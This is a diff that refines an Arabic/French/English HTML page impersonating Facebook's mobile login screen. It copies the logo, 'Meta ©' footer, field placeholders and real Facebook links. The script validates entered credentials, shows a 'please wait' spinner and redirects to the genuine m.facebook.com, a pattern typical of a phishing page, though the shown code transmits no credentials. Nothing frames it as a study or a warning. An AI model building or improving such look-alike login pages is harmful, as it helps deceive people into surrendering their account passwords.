@@ -2,194 +2,147 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Facebook</title>
   <style>
-    body {
-      margin: 0;
-      font-family: Helvetica, Arial, sans-serif;
-      background: #f0f2f5;
-      padding: 10px;
+    :root{
+      --blue:#1877f2;
+      --border:#dadde1;
+      --text:#1c1e21;
+      --muted:#606770;
+      --bg:#ffffff;
+      --radius-xl:26px;
+      --radius-lg:18px;
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0;
+      font-family:Helvetica, Arial, sans-serif;
+      background:var(--bg);
+      color:var(--text);
+      -webkit-tap-highlight-color: transparent;
     }
 
-    .header {
-      text-align: center;
-      padding: 20px 0 10px;
+    .top{display:flex;justify-content:center;padding:16px 12px 0;}
+    .lang{position:relative;}
+    .lang select{
+      appearance:none;border:none;background:transparent;
+      font-size:16px;font-weight:600;color:#6b6f75;
+      padding:4px 22px 4px 8px;cursor:pointer;
     }
-    .header h1 {
-      color: #1877f2;
-      font-size: 36px;
-      margin: 0;
-      font-weight: bold;
-    }
-
-    .lang-box {
-      text-align: center;
-      margin-bottom: 15px;
-    }
-    .lang-box select {
-      padding: 8px 12px;
-      border-radius: 6px;
-      border: 1px solid #ccc;
-      font-size: 14px;
-      cursor: pointer;
-      width: 100%;
-      max-width: 200px;
+    .lang::after{
+      content:"▾";position:absolute;right:2px;top:50%;
+      transform:translateY(-45%);font-size:14px;color:#6b6f75;
+      pointer-events:none;
     }
 
-    .container {
-      display: flex;
-      justify-content: center;
-      align-items: flex-start;
-      padding: 10px;
+    .logo-wrap{display:flex;justify-content:center;padding:18px 0 8px;}
+    .logo{width:82px;height:82px;border:1px solid var(--border);border-radius:50%;
+      display:flex;align-items:center;justify-content:center;background:#fff;}
+    .logo img{width:40px;height:40px}
+
+    .box{width:100%;max-width:360px;margin:8px auto 0;padding:0 16px;text-align:center;}
+
+    .field{
+      display:flex;align-items:center;gap:10px;width:100%;
+      border:1px solid var(--border);border-radius:var(--radius-lg);
+      background:#fff;padding:10px 14px;margin-bottom:12px;min-height:56px;
+    }
+    .field input{
+      flex:1;border:none;outline:none;font-size:16px;background:transparent;color:var(--text);
+    }
+    .field input::placeholder{color:#8d949e}
+
+    .info-dot{
+      width:28px;height:28px;border-radius:50%;border:1px solid var(--border);
+      display:flex;align-items:center;justify-content:center;font-weight:bold;color:#7a7f85;
+      font-family:Arial, Helvetica, sans-serif;flex-shrink:0;
     }
 
-    .login-box {
-      background: #fff;
-      padding: 15px;
-      border-radius: 8px;
-      width: 100%;
-      max-width: 360px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
-      text-align: center;
-      position: relative;
+    .btn-primary{
+      width:100%;border:none;border-radius:var(--radius-xl);
+      background:var(--blue);color:#fff;font-weight:700;font-size:17px;
+      padding:14px 16px;cursor:pointer;
+    }
+    .btn-primary:active{transform:scale(0.995)}
+
+    .forgot{margin:14px 0 28px;font-size:15px;}
+    .forgot a{text-decoration:none;color:var(--text);}
+
+    .create a{
+      display:inline-block;width:100%;text-decoration:none;text-align:center;
+      padding:12px 16px;border:1px solid var(--blue);color:var(--blue);
+      border-radius:var(--radius-xl);font-weight:700;font-size:16px;
     }
 
-    .input-wrapper {
-      position: relative;
-      width: 100%;
-      margin-bottom: 12px;
-    }
+    .meta{text-align:center;color:#7a7f85;margin:22px 0 12px;font-size:14px;}
 
-    .login-box input {
-      width: 100%;
-      padding: 14px;
-      border-radius: 6px;
-      border: 1px solid #dddfe2;
-      font-size: 16px;
+    .msg{
+      margin-top:10px;display:flex;justify-content:center;align-items:center;gap:8px;
+      visibility:hidden;font-size:14px;color:#333;
     }
+    .spinner{
+      width:16px;height:16px;border:2px solid #ccc;border-top:2px solid var(--blue);
+      border-radius:50%;animation:spin .8s linear infinite;
+    }
+    @keyframes spin{to{transform:rotate(360deg)}}
 
-    .popup {
-      position: absolute;
-      bottom: -28px;
-      left: 10px;
-      background: #000;
-      color: #fff;
-      padding: 6px 10px;
-      border-radius: 6px;
-      font-size: 13px;
-      white-space: nowrap;
-      display: none;
-    }
-    .popup::after {
-      content: "";
-      position: absolute;
-      top: -6px;
-      left: 15px;
-      border-width: 6px;
-      border-style: solid;
-      border-color: transparent transparent #000 transparent;
-    }
-
-    .error-text {
-      font-size: 12px;
-      color: red;
-      text-align: right;
-      margin-top: 4px;
-      display: none;
-    }
-
-    .login-box button {
-      width: 100%;
-      padding: 14px;
-      margin: 10px 0;
-      border: none;
-      border-radius: 6px;
-      background: #1877f2;
-      color: #fff;
-      font-weight: bold;
-      font-size: 18px;
-      cursor: pointer;
-    }
-    .login-box button:hover {
-      background: #166fe5;
-    }
-
-    .msg {
-      margin-top: 15px;
-      font-weight: bold;
-      color: #333;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      gap: 8px;
-      visibility: hidden;
-      font-size: 14px;
-    }
-
-    .spinner {
-      width: 16px;
-      height: 16px;
-      border: 2px solid #ccc;
-      border-top: 2px solid #1877f2;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-    }
-    @keyframes spin {
-      100% { transform: rotate(360deg); }
-    }
-
-    .create-account {
-      margin-top: 15px;
-      font-size: 14px;
-    }
-    .create-account a {
-      color: #1877f2;
-      text-decoration: none;
-      font-weight: bold;
-    }
+    .popup,.error-text{display:none;color:#e53935;font-size:12px;text-align:right;margin:6px 2px -2px 0;}
   </style>
 </head>
 <body>
 
-  <div class="header">
-    <h1>facebook</h1>
-  </div>
-
-  <div class="lang-box">
-    <select id="languageSwitcher">
-      <option value="ar" selected>العربية</option>
-      <option value="fr">Français</option>
-      <option value="en">English</option>
-    </select>
-  </div>
-
-  <div class="container">
-    <div class="login-box">
-      <form id="myForm">
-        <div class="input-wrapper">
-          <input type="text" id="emailInput" placeholder="البريد الإلكتروني أو رقم الهاتف">
-          <div class="popup" id="emailPopup"></div>
-          <div class="error-text" id="emailErrorText"></div>
-        </div>
-
-        <div class="input-wrapper">
-          <input type="password" id="passwordInput" placeholder="كلمة المرور">
-          <div class="popup" id="passwordPopup"></div>
-        </div>
-
-        <button type="submit" id="loginBtn">تسجيل الدخول</button>
-      </form>
-
-      <div class="msg" id="msg">
-        <div class="spinner"></div> <span id="waitMsg">يرجى الإنتظار...</span>
-      </div>
-
-      <div class="create-account">
-        <span id="noAccount">ليس لديك حساب؟</span>
-        <a href="https://m.facebook.com/reg/" id="createAccount">إنشاء حساب جديد</a>
-      </div>
+  <!-- اللغة -->
+  <div class="top">
+    <div class="lang">
+      <select id="languageSwitcher">
+        <option value="ar" selected>العربية</option>
+        <option value="fr">Français</option>
+        <option value="en">English</option>
+      </select>
     </div>
+  </div>
+
+  <!-- الشعار -->
+  <div class="logo-wrap">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook">
+    </div>
+  </div>
+
+  <!-- النموذج -->
+  <div class="box">
+    <form id="myForm" novalidate>
+      <div class="field">
+        <div class="info-dot">i</div>
+        <input type="text" id="emailInput" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني">
+      </div>
+      <div class="popup" id="emailPopup"></div>
+      <div class="error-text" id="emailErrorText"></div>
+
+      <div class="field">
+        <input type="password" id="passwordInput" placeholder="كلمة السر">
+      </div>
+      <div class="popup" id="passwordPopup"></div>
+
+      <button type="submit" class="btn-primary" id="loginBtn">تسجيل الدخول</button>
+    </form>
+
+    <!-- رابط كلمة السر ثابت -->
+    <div class="forgot">
+      <a href="https://m.facebook.com/login/identify/" id="forgotLink">هل نسيت كلمة السر؟</a>
+    </div>
+
+    <div class="msg" id="msg">
+      <div class="spinner"></div><span id="waitMsg">يرجى الإنتظار...</span>
+    </div>
+
+    <!-- رابط إنشاء حساب ثابت -->
+    <div class="create">
+      <a href="https://m.facebook.com/reg/" id="createAccount">إنشاء حساب جديد</a>
+    </div>
+
+    <div class="meta">Meta ©</div>
   </div>
 
   <script>
@@ -201,53 +154,55 @@
     const msg = document.getElementById("msg");
     const langSwitcher = document.getElementById("languageSwitcher");
     const emailErrorText = document.getElementById("emailErrorText");
+    const forgotLink = document.getElementById("forgotLink");
+    const createAccount = document.getElementById("createAccount");
 
     const translations = {
       ar: {
-        email: "البريد الإلكتروني أو رقم الهاتف",
-        password: "كلمة المرور",
+        email: "رقم الهاتف المحمول أو البريد الإلكتروني",
+        password: "كلمة السر",
         login: "تسجيل الدخول",
         wait: "يرجى الإنتظار...",
-        noAccount: "ليس لديك حساب؟",
-        create: "إنشاء حساب جديد",
         emailError: "أدخل رقم أو إيميل صحيح",
         passError: "يرجى إدخال كلمة المرور الصحيحة",
-        emailWrong: "رقم أو إيميل خاطئ"
+        emailWrong: "رقم أو إيميل خاطئ",
+        forgot: "هل نسيت كلمة السر؟",
+        create: "إنشاء حساب جديد"
       },
       fr: {
         email: "E-mail ou numéro de téléphone",
         password: "Mot de passe",
         login: "Se connecter",
         wait: "Veuillez patienter...",
-        noAccount: "Vous n'avez pas de compte ?",
-        create: "Créer un nouveau compte",
         emailError: "Veuillez entrer un email ou numéro valide",
         passError: "Veuillez entrer un mot de passe correct",
-        emailWrong: "Email ou numéro incorrect"
+        emailWrong: "Email ou numéro incorrect",
+        forgot: "Mot de passe oublié ?",
+        create: "Créer un nouveau compte"
       },
       en: {
         email: "Email or Phone",
         password: "Password",
         login: "Log In",
         wait: "Please wait...",
-        noAccount: "Don't have an account?",
-        create: "Create New Account",
         emailError: "Enter a valid email or phone",
         passError: "Please enter the correct password",
-        emailWrong: "Wrong email or phone"
+        emailWrong: "Wrong email or phone",
+        forgot: "Forgot password?",
+        create: "Create New Account"
       }
     };
 
     let currentLang = "ar";
 
-    function changeLanguage(lang) {
+    function changeLanguage(lang){
       currentLang = lang;
       emailInput.placeholder = translations[lang].email;
       passwordInput.placeholder = translations[lang].password;
       document.getElementById("loginBtn").innerText = translations[lang].login;
       document.getElementById("waitMsg").innerText = translations[lang].wait;
-      document.getElementById("noAccount").innerText = translations[lang].noAccount;
-      document.getElementById("createAccount").innerText = translations[lang].create;
+      forgotLink.innerText = translations[lang].forgot;
+      createAccount.innerText = translations[lang].create;
 
       emailPopup.style.display = "none";
       passwordPopup.style.display = "none";
@@ -257,51 +212,46 @@
       document.documentElement.lang = lang;
     }
 
-    langSwitcher.addEventListener("change", e => {
-      changeLanguage(e.target.value);
-    });
+    langSwitcher.addEventListener("change", e => changeLanguage(e.target.value));
 
-    function isValidEmailOrPhone(value) {
-      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-      const phoneRegex = /^[0-9]{6,15}$/;
-      return emailRegex.test(value) || phoneRegex.test(value);
+    function isValidEmailOrPhone(value){
+      const emailRegex=/^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      const phoneRegex=/^[0-9]{6,15}$/;
+      return emailRegex.test(value)||phoneRegex.test(value);
     }
 
-    form.addEventListener("submit", e => {
+    form.addEventListener("submit", e=>{
       e.preventDefault();
       let valid = true;
 
-      if (emailInput.value.trim() === "") {
+      if (emailInput.value.trim()===""){
         emailPopup.innerText = translations[currentLang].emailError;
-        emailPopup.style.display = "block";
-        setTimeout(() => emailPopup.style.display = "none", 3000);
-        valid = false;
-      } else if (!isValidEmailOrPhone(emailInput.value.trim())) {
+        emailPopup.style.display="block";
+        setTimeout(()=>emailPopup.style.display="none",3000);
+        valid=false;
+      }else if(!isValidEmailOrPhone(emailInput.value.trim())){
         emailErrorText.innerText = translations[currentLang].emailWrong;
-        emailErrorText.style.display = "block";
-        valid = false;
-      } else {
-        emailPopup.style.display = "none";
-        emailErrorText.style.display = "none";
+        emailErrorText.style.display="block";
+        valid=false;
+      }else{
+        emailPopup.style.display="none";
+        emailErrorText.style.display="none";
       }
 
-      if (passwordInput.value.trim() === "") {
+      if (passwordInput.value.trim()===""){
         passwordPopup.innerText = translations[currentLang].passError;
-        passwordPopup.style.display = "block";
-        setTimeout(() => passwordPopup.style.display = "none", 3000);
-        valid = false;
-      } else {
-        passwordPopup.style.display = "none";
+        passwordPopup.style.display="block";
+        setTimeout(()=>passwordPopup.style.display="none",3000);
+        valid=false;
+      }else{
+        passwordPopup.style.display="none";
       }
 
-      if (!valid) return;
+      if(!valid) return;
 
-      msg.style.visibility = "visible";
-      setTimeout(() => {
-        window.location.href = "https://m.facebook.com";
-      }, 1500);
+      msg.style.visibility="visible";
+      setTimeout(()=>{ window.location.href="https://m.facebook.com"; },1500);
     });
   </script>
-
 </body>
 </html>
